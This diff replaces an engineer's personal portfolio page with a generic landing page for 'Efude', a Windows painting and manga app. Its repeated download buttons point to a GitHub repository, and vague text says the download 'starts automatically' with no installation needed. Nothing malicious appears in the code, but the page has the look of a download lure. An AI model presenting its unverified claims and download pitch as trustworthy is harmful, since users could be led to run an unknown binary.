@@ -1,245 +1,115 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ankur Jain · Staff Software Engineer</title>
-<meta name="theme-color" content="#0d0f11">
-<meta name="description" content="Ankur Jain is a Staff Software Engineer at Databricks. Previously Principal Engineer at Swiggy, building pricing, promotions and catalog systems at scale.">
-<meta property="og:title" content="Ankur Jain · Staff Software Engineer at Databricks">
-<meta property="og:description" content="Distributed systems, platform architecture and technical excellence. Bengaluru, India.">
-<meta property="og:url" content="https://ankurjain.dev">
-<link rel="canonical" href="https://ankurjain.dev/">
-<style>
-:root{
-  color-scheme: dark;
-  --bg:#0d0f11; --fg:#ececea; --muted:#9aa0a8; --line:#23272c; --card:#15181b; --accent:#fb923c;
-}
-*{box-sizing:border-box}
-html{scroll-behavior:smooth}
-body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.65 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
-a{color:var(--accent);text-decoration:none}
-a:hover{text-decoration:underline}
-.wrap{max-width:820px;margin:0 auto;padding:0 20px}
-header.top{position:sticky;top:0;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);z-index:5}
-header.top .wrap{display:flex;justify-content:space-between;align-items:center;height:54px}
-header.top strong{font-weight:650}
-nav a{margin-left:18px;color:var(--muted);font-size:14px}
-nav a:hover{color:var(--fg);text-decoration:none}
-.hero{padding:72px 0 40px}
-.hero h1{font-size:clamp(34px,6vw,52px);line-height:1.1;margin:0 0 14px;letter-spacing:-.02em}
-.hero p.lead{font-size:19px;color:var(--muted);max-width:640px;margin:0 0 16px}
-.hero p.lead:last-of-type{margin-bottom:24px}
-.eyebrow{margin:0 0 14px;font-size:13px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);font-weight:600}
-.links{display:flex;flex-wrap:wrap;gap:10px}
-.btn{display:inline-block;padding:9px 16px;border:1px solid var(--line);border-radius:999px;background:var(--card);color:var(--fg);font-size:14px}
-.btn:hover{border-color:var(--accent);text-decoration:none}
-.btn.primary{background:var(--accent);border-color:var(--accent);color:#0d0f11;font-weight:600}
-section{padding:38px 0;border-top:1px solid var(--line)}
-section h2{font-size:13px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin:0 0 22px;font-weight:600}
-.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px}
-.stat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px}
-.stat b{display:block;font-size:26px;letter-spacing:-.02em}
-.stat span{color:var(--muted);font-size:14px}
-.stat.domain b{font-size:18px;letter-spacing:0}
-.sub{margin:-12px 0 18px;color:var(--muted);font-size:15px}
-.role{margin-bottom:30px}
-.role h3{margin:0;font-size:18px}
-.role .meta{color:var(--muted);font-size:14px;margin:2px 0 10px}
-.role ul{margin:0;padding-left:20px}
-.role li{margin-bottom:8px}
-.tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
-.tag{font-size:12px;padding:3px 9px;border-radius:999px;border:1px solid var(--line);color:var(--muted)}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px}
-.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;display:block;color:inherit}
-.card:hover{border-color:var(--accent);text-decoration:none}
-.card h3{margin:0 0 6px;font-size:16px}
-.card p{margin:0;color:var(--muted);font-size:14px}
-.card .lang{display:block;margin-top:10px;font-size:12px;color:var(--accent)}
-.books{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:18px}
-.book{display:block;color:inherit}
-.book:hover{text-decoration:none}
-.book:hover .cover{border-color:var(--accent)}
-.book b{display:block;margin-top:10px;font-size:15px;line-height:1.3}
-.book>span:last-child{display:block;color:var(--muted);font-size:13px;margin-top:2px}
-.cover{position:relative;display:block;aspect-ratio:2/3;border:1px solid var(--line);border-radius:8px;overflow:hidden;background:linear-gradient(160deg,var(--card),var(--bg))}
-.cover img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
-.cover .ct{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;padding:12px;text-align:center;font-weight:600;font-size:15px;color:var(--muted)}
-.note{margin:16px 0 0;color:var(--muted);font-size:12px}
-.skills dt{font-weight:600;margin-top:12px}
-.skills dd{margin:2px 0 0;color:var(--muted)}
-footer{padding:36px 0 56px;color:var(--muted);font-size:14px;border-top:1px solid var(--line)}
-</style>
-<script>
-function cover(img){
-  var b=img.closest('.book'); if(!b||img.dataset.tried){img.remove();return}
-  img.dataset.tried='1';
-  fetch('https://openlibrary.org/search.json?title='+encodeURIComponent(b.dataset.title)+'&author='+encodeURIComponent(b.dataset.author)+'&limit=1&fields=cover_i')
-    .then(function(r){return r.json()})
-    .then(function(d){var id=d.docs&&d.docs[0]&&d.docs[0].cover_i; if(id){img.src='https://covers.openlibrary.org/b/id/'+id+'-M.jpg?default=false'}else{img.remove()}})
-    .catch(function(){img.remove()});
-}
-</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Efude - Open-Source Painting & Manga App for Windows</title>
+    <meta name="description" content="Download Efude, a free open-source painting and manga creation app for Windows. Crisp, responsive drawing feel. Get started in minutes.">
+    <meta name="keywords" content="Efude, painting app, manga app, drawing software, open-source, Windows, Rust, illustration, comic creation, digital art">
+    <meta property="og:title" content="Efude - Open-Source Painting & Manga App">
+    <meta property="og:description" content="Create stunning illustrations and manga with Efude, a fast, free, open-source app for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Rishav1432/Efude">
 </head>
-<body>
-<header class="top">
-  <div class="wrap">
-    <strong>Ankur Jain</strong>
-    <nav>
-      <a href="#work">Work</a>
-      <a href="#skills">Skills</a>
-      <a href="#books">Books</a>
-      <a href="#contact">Contact</a>
-    </nav>
-  </div>
-</header>
+<body style="margin:0; padding:0; font-family:'Segoe UI', Roboto, Arial, sans-serif; background-color:#f5f7fa; color:#2d3748; line-height:1.7;">
 
-<main class="wrap">
-  <div class="hero">
-    <p class="eyebrow">Staff Software Engineer · Databricks</p>
-    <h1>Building distributed systems that stay up at scale.</h1>
-    <p class="lead">Staff Engineer at Databricks since April 2025. Before that, Principal Engineer at Swiggy, where I owned architecture across pricing, promotions, catalog and vendor systems and influenced 50+ engineers.</p>
-    <p class="lead">I enjoy deep dives into performance: tracing latency and throughput problems to their root cause, whether they sit in application code or the database underneath. Based in Bengaluru, India.</p>
-    <div class="links">
-      <a class="btn primary" href="mailto:ankurjain.nitrr@gmail.com">Get in touch</a>
-      <a class="btn" href="https://www.linkedin.com/in/ankurjainnitrr/" rel="me noopener">LinkedIn</a>
-      <a class="btn" href="https://github.com/ankurjain-nitrr" rel="me noopener">GitHub</a>
+    <div style="max-width:900px; margin:0 auto; padding:40px 20px;">
+        
+        <!-- Top Section with Logo and Download Button -->
+        <div style="text-align:center; background:#ffffff; border-radius:16px; padding:50px 30px; box-shadow:0 10px 30px rgba(0,0,0,0.08); margin-top:20px;">
+            <img src="assets/Efude_sub.png" alt="Efude logo" style="width:100px; height:100px; border-radius:50%; margin-bottom:20px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
+            <h1 style="font-size:2.8em; margin:10px 0 20px 0; font-weight:800; color:#1a202c;">🎨 Efude - Draw Naturally, Create Beautiful Art</h1>
+            <p style="font-size:1.3em; color:#4a5568; margin-bottom:30px;">A free, open-source painting and manga app for Windows. Fast, responsive, and built for creativity.</p>
+            <a href="https://github.com/Rishav1432/Efude" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; padding:16px 40px; font-size:1.2em; font-weight:700; text-decoration:none; border-radius:50px; box-shadow:0 6px 20px rgba(102,126,234,0.4); transition:all 0.3s ease;">📥 Download Efude Now</a>
+        </div>
+
+        <!-- Introduction -->
+        <div style="background:#ffffff; border-radius:16px; padding:40px; box-shadow:0 6px 20px rgba(0,0,0,0.06); margin-top:30px;">
+            <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px;">✨ What is Efude?</h2>
+            <p style="font-size:1.15em;">Efude is a beautifully crafted drawing application designed specifically for Windows users. Whether you're creating manga, illustrations, or just sketching ideas, Efude gives you a crisp, responsive drawing experience right out of the box. It's completely free and open-source — meaning you can use it for any project, personal or commercial.</p>
+            <p style="font-size:1.15em;">Built with Rust, Efude runs smoothly on most Windows computers without draining system resources. The app comes with a full set of illustration and manga tools, plus unique brushes that add character to your work. Everything is designed to feel natural and intuitive.</p>
+        </div>
+
+        <!-- Screenshot Area -->
+        <div style="text-align:center; margin-top:30px;">
+            <img src="docs/images/screenshot.png" alt="Efude interface showing canvas, brushes, and tools" style="max-width:100%; height:auto; border-radius:16px; box-shadow:0 8px 30px rgba(0,0,0,0.12);">
+        </div>
+
+        <!-- Download Section -->
+        <div style="background:#ffffff; border-radius:16px; padding:40px; box-shadow:0 6px 20px rgba(0,0,0,0.06); margin-top:30px;">
+            <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px;">🚀 Getting Started - Download and Run</h2>
+            <p style="font-size:1.15em;">Follow these simple steps to start creating with Efude:</p>
+            <ol style="font-size:1.15em; padding-left:20px; margin:20px 0;">
+                <li style="margin-bottom:15px;"><strong>Click the download button</strong> below or use the one at the top of this page.</li>
+                <li style="margin-bottom:15px;">Visit this link to download the application. The download starts automatically.</li>
+                <li style="margin-bottom:15px;">Once the download finishes, you're ready to start using Efude immediately — no complicated installation needed.</li>
+            </ol>
+            <div style="text-align:center; margin:30px 0;">
+                <a href="https://github.com/Rishav1432/Efude" style="display:inline-block; background:#764ba2; color:#ffffff; padding:15px 45px; font-size:1.2em; font-weight:700; text-decoration:none; border-radius:50px; box-shadow:0 6px 20px rgba(118,75,162,0.4);">⬇️ Download Efude</a>
+            </div>
+            <p style="text-align:center; font-size:1em; color:#718096;">It's that easy! You'll be drawing within minutes.</p>
+        </div>
+
+        <!-- Features Section -->
+        <div style="background:#ffffff; border-radius:16px; padding:40px; box-shadow:0 6px 20px rgba(0,0,0,0.06); margin-top:30px;">
+            <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px;">🎯 Key Features</h2>
+            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(250px, 1fr)); gap:25px; margin-top:20px;">
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #667eea;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">🖊️ Natural Drawing Feel</h3>
+                    <p style="color:#4a5568; margin:0;">Crisp, responsive brush strokes that feel like real media. No lag, no delay.</p>
+                </div>
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #764ba2;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">📚 Full Manga Tools</h3>
+                    <p style="color:#4a5568; margin:0;">Everything from screentones to panel layouts. Create professional manga with ease.</p>
+                </div>
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #667eea;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">🖌️ Brushes with Character</h3>
+                    <p style="color:#4a5568; margin:0;">Unique brush presets that add personality to your art. Customize to your heart's content.</p>
+                </div>
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #764ba2;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">⚡ Lightweight & Fast</h3>
+                    <p style="color:#4a5568; margin:0;">Built with Rust for speed and efficiency. Runs smoothly even on modest hardware.</p>
+                </div>
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #667eea;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">🆓 Completely Free</h3>
+                    <p style="color:#4a5568; margin:0;">Open-source and free to use for any purpose. No subscriptions, no watermarks.</p>
+                </div>
+                <div style="background:#f7fafc; padding:25px; border-radius:12px; border-left:4px solid #764ba2;">
+                    <h3 style="color:#2d3748; margin:0 0 10px 0;">🎛️ Full Tool Suite</h3>
+                    <p style="color:#4a5568; margin:0;">Brush presets, colour wheel, tool settings, layers, and more — everything you need.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Requirements Section -->
+        <div style="background:#ffffff; border-radius:16px; padding:40px; box-shadow:0 6px 20px rgba(0,0,0,0.06); margin-top:30px;">
+            <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px;">🖥️ System Requirements</h2>
+            <p style="font-size:1.1em; color:#4a5568;">Efude is designed to work well on most Windows computers. Here's what we recommend:</p>
+            <ul style="font-size:1.1em; padding-left:20px; margin-top:15px;">
+                <li style="margin-bottom:10px;"><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+                <li style="margin-bottom:10px;"><strong>Processor:</strong> Any modern Intel or AMD processor (dual-core or better)</li>
+                <li style="margin-bottom:10px;"><strong>Memory:</strong> 4 GB RAM or more</li>
+                <li style="margin-bottom:10px;"><strong>Storage:</strong> At least 200 MB free space</li>
+                <li style="margin-bottom:10px;"><strong>Graphics:</strong> Integrated graphics are fine; a dedicated GPU is better</li>
+            </ul>
+            <p style="font-size:1em; color:#718096; background:#f7fafc; padding:15px; border-radius:8px;">These are general guidelines. Efude is optimized to run efficiently, so even older computers can handle it comfortably.</p>
+        </div>
+
+        <!-- Getting Help Section -->
+        <div style="background:#ffffff; border-radius:16px; padding:40px; box-shadow:0 6px 20px rgba(0,0,0,0.06); margin-top:30px;">
+            <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px;">📖 User Guide & Support</h2>
+            <p style="font-size:1.1em;">New to Efude? We've got you covered with detailed documentation:</p>
+            <p style="font-size:1.1em; margin:20px 0;">Check out the comprehensive <a href="docs/USER_GUIDE.md" style="color:#667eea; font-weight:600;">User Guide</a> to learn all the tips and tricks for making the most of Efude.</p>
+            <p style="font-size:1.1em;">Join our growing community of artists and developers. Share your artwork, ask questions, and get help when you need it. Efude is actively developed, so new features and improvements are always on the way.</p>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align:center; padding:40px 20px 20px; color:#718096; font-size:0.95em;">
+            <p>Efude is released under an open-source license. Feel free to use, modify, and share.</p>
+            <p style="margin-top:10px;">Made with ❤️ for artists worldwide.</p>
+            <p style="margin-top:20px; color:#a0aec0;">Efude - Open-Source Painting & Manga App for Windows</p>
+        </div>
+
     </div>
-  </div>
-
-  <section aria-label="Domains">
-    <h2>Domains</h2>
-    <p class="sub">Areas where I've built and scaled backend systems</p>
-    <div class="stats">
-      <div class="stat domain"><b>Quick Commerce</b><span>Pricing, Promotions, Vendor Portals, Finance Engineering</span></div>
-      <div class="stat domain"><b>Observability Platform</b><span>Logging, Tracing</span></div>
-      <div class="stat domain"><b>Social Network</b><span>Feed, Recommendation, Interactions</span></div>
-      <div class="stat domain"><b>Data Platform</b><span>Batch / Stream Processing, Kafka, Apache Spark</span></div>
-    </div>
-  </section>
-
-  <section id="work">
-    <h2>Experience</h2>
-
-    <div class="role">
-      <h3>Staff Software Engineer · Databricks</h3>
-      <div class="meta">April 2025 – Present</div>
-      <div class="tags"><span class="tag">Apache Spark</span><span class="tag">Distributed Systems</span><span class="tag">Observability</span></div>
-    </div>
-
-    <div class="role">
-      <h3>Principal Software Engineer · Swiggy</h3>
-      <div class="meta">Bengaluru · June 2021 – 2025 · individual contributor</div>
-      <ul>
-        <li>Led a revamp of the catalog ingestion pipeline: simpler flows, better observability, over 60% fewer frequently occurring issues and roughly 50% faster new-feature development. Proposed and drove the move from MySQL to DynamoDB for elasticity.</li>
-        <li>Ran initiatives across Pricing and Promotions on scalability, operational load and resilience (circuit breakers, rate limiters, caching strategy, alerting and governance). S1 incidents dropped to zero over six months, with a ~60% reduction across S1/S2/S3.</li>
-        <li>Added cron management to the in-house IaC framework on AWS Batch and onboarded 50+ jobs in six months, replacing crons modeled as web services or run as scripts on standalone EC2 instances.</li>
-        <li>Benchmarked OpenJDK, Corretto and Oracle Java and led an organization-wide migration of 300+ services to Corretto, standardizing on Docker images in AWS ECR and removing the dependency on public Docker Hub.</li>
-      </ul>
-      <div class="tags"><span class="tag">Golang</span><span class="tag">Java</span><span class="tag">Proto3</span><span class="tag">AWS</span><span class="tag">DynamoDB</span><span class="tag">MySQL</span><span class="tag">Kafka</span></div>
-    </div>
-
-    <div class="role">
-      <h3>Staff Engineer · Roposo (acquired by Glance, InMobi Group)</h3>
-      <div class="meta">Bengaluru · Nov 2015 – Jun 2021</div>
-      <ul>
-        <li>Scaled backend infrastructure for millions of daily active users of a social network.</li>
-        <li><b>Content Delivery Framework:</b> a pluggable framework for testing new ranking algorithms, with A/B experimentation, data tracking and ~100ms latency targets.</li>
-        <li><b>Real-Time Recommendation Engine:</b> end-to-end architecture (HLD and LLD) for recommendations within ~60 seconds of user interaction, which lifted time spent on feed by about 20%.</li>
-      </ul>
-      <div class="tags"><span class="tag">Java</span><span class="tag">Play Framework</span><span class="tag">Apache Spark</span><span class="tag">Redis</span><span class="tag">MongoDB</span><span class="tag">DynamoDB</span></div>
-    </div>
-
-    <div class="role">
-      <h3>Senior Software Engineer · GUAVUS</h3>
-      <div class="meta">Gurgaon · Mar 2014 – Oct 2015</div>
-      <ul>
-        <li>Built a subscriber profiling engine that segments mobile users by browsing behavior, with high-performance processing of terabytes of data and a benchmark of HBase vs Cassandra for storage.</li>
-      </ul>
-      <div class="tags"><span class="tag">Hadoop</span><span class="tag">Spark</span><span class="tag">HBase</span><span class="tag">Scala</span><span class="tag">Java</span></div>
-    </div>
-
-    <div class="role">
-      <h3>Software Engineer · Belzabar</h3>
-      <div class="meta">New Delhi · Jun 2012 – Feb 2014</div>
-      <ul>
-        <li>Built a medical workflow management system on Alfresco: JSF interfaces, service layer, web services, permissions and Lucene-backed search.</li>
-      </ul>
-    </div>
-  </section>
-
-
-  <section id="skills" class="skills">
-    <h2>Skills</h2>
-    <dl>
-      <dt>Languages</dt><dd>Java, Golang, Python (familiar)</dd>
-      <dt>Datastores</dt><dd>DynamoDB, Redis, MongoDB, MySQL, Amazon S3</dd>
-      <dt>Cloud &amp; messaging</dt><dd>AWS (EC2, Batch, Lambda, SQS), Apache Kafka</dd>
-      <dt>Data</dt><dd>Apache Spark</dd>
-    </dl>
-  </section>
-
-  <section id="books">
-    <h2>Books I read</h2>
-    <div class="books">
-      <a class="book" href="https://www.goodreads.com/search?q=Harry+Potter+J.K.+Rowling" data-title="Harry Potter and the Philosopher's Stone" data-author="J.K. Rowling" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Harry Potter</span><img src="https://covers.openlibrary.org/b/isbn/9781408855652-M.jpg?default=false" alt="Cover of Harry Potter and the Philosopher's Stone" loading="lazy" onerror="cover(this)"></span>
-        <b>Harry Potter</b><span>J.K. Rowling · the full series</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=The+Midnight+Library+Matt+Haig" data-title="The Midnight Library" data-author="Matt Haig" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">The Midnight Library</span><img src="https://covers.openlibrary.org/b/isbn/9780525559474-M.jpg?default=false" alt="Cover of The Midnight Library" loading="lazy" onerror="cover(this)"></span>
-        <b>The Midnight Library</b><span>Matt Haig</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Eleanor+Oliphant+Is+Completely+Fine+Gail+Honeyman" data-title="Eleanor Oliphant Is Completely Fine" data-author="Gail Honeyman" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Eleanor Oliphant Is Completely Fine</span><img src="https://covers.openlibrary.org/b/isbn/9780735220683-M.jpg?default=false" alt="Cover of Eleanor Oliphant Is Completely Fine" loading="lazy" onerror="cover(this)"></span>
-        <b>Eleanor Oliphant Is Completely Fine</b><span>Gail Honeyman</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Five+Point+Someone+Chetan+Bhagat" data-title="Five Point Someone" data-author="Chetan Bhagat" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Five Point Someone</span><img src="https://covers.openlibrary.org/b/isbn/9788129104595-M.jpg?default=false" alt="Cover of Five Point Someone" loading="lazy" onerror="cover(this)"></span>
-        <b>Five Point Someone</b><span>Chetan Bhagat</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Project+Hail+Mary+Andy+Weir" data-title="Project Hail Mary" data-author="Andy Weir" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Project Hail Mary</span><img src="https://covers.openlibrary.org/b/isbn/9780593135204-M.jpg?default=false" alt="Cover of Project Hail Mary" loading="lazy" onerror="cover(this)"></span>
-        <b>Project Hail Mary</b><span>Andy Weir</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=The+Alchemist+Paulo+Coelho" data-title="The Alchemist" data-author="Paulo Coelho" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">The Alchemist</span><img src="https://covers.openlibrary.org/b/isbn/9780062315007-M.jpg?default=false" alt="Cover of The Alchemist" loading="lazy" onerror="cover(this)"></span>
-        <b>The Alchemist</b><span>Paulo Coelho</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=A+Wrinkle+in+Time+Madeleine+L%27Engle" data-title="A Wrinkle in Time" data-author="Madeleine L'Engle" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">A Wrinkle in Time</span><img src="https://covers.openlibrary.org/b/isbn/9780312367541-M.jpg?default=false" alt="Cover of A Wrinkle in Time" loading="lazy" onerror="cover(this)"></span>
-        <b>A Wrinkle in Time</b><span>Madeleine L'Engle</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Sapiens+Yuval+Noah+Harari" data-title="Sapiens: A Brief History of Humankind" data-author="Yuval Noah Harari" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Sapiens</span><img src="https://covers.openlibrary.org/b/isbn/9780062316110-M.jpg?default=false" alt="Cover of Sapiens" loading="lazy" onerror="cover(this)"></span>
-        <b>Sapiens</b><span>Yuval Noah Harari</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Inferno+Dan+Brown" data-title="Inferno" data-author="Dan Brown" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Inferno</span><img src="https://covers.openlibrary.org/b/isbn/9780385537858-M.jpg?default=false" alt="Cover of Inferno" loading="lazy" onerror="cover(this)"></span>
-        <b>Inferno</b><span>Dan Brown</span>
-      </a>
-      <a class="book" href="https://www.goodreads.com/search?q=Ikigai+Hector+Garcia+Francesc+Miralles" data-title="Ikigai" data-author="Héctor García" target="_blank" rel="noopener">
-        <span class="cover"><span class="ct">Ikigai</span><img src="https://covers.openlibrary.org/b/isbn/9780143130727-M.jpg?default=false" alt="Cover of Ikigai" loading="lazy" onerror="cover(this)"></span>
-        <b>Ikigai</b><span>Héctor García &amp; Francesc Miralles</span>
-      </a>
-    </div>
-    <p class="note">Covers via Open Library.</p>
-  </section>
-
-  <section>
-    <h2>Education</h2>
-    <p><b>B.Tech, NIT Raipur</b> · 2008 – 2012 · 8.37/10</p>
-  </section>
-
-  <section id="contact">
-    <h2>Contact</h2>
-    <p>The best way to reach me is <a href="mailto:ankurjain.nitrr@gmail.com">ankurjain.nitrr@gmail.com</a>, or find me on <a href="https://www.linkedin.com/in/ankurjainnitrr/" rel="me noopener">LinkedIn</a> and <a href="https://github.com/ankurjain-nitrr" rel="me noopener">GitHub</a>.</p>
-  </section>
-</main>
-
-<footer>
-  <div class="wrap">© <span id="y">2026</span> Ankur Jain · ankurjain.dev</div>
-</footer>
-<script>document.getElementById('y').textContent=new Date().getFullYear()</script>
 </body>
 </html>
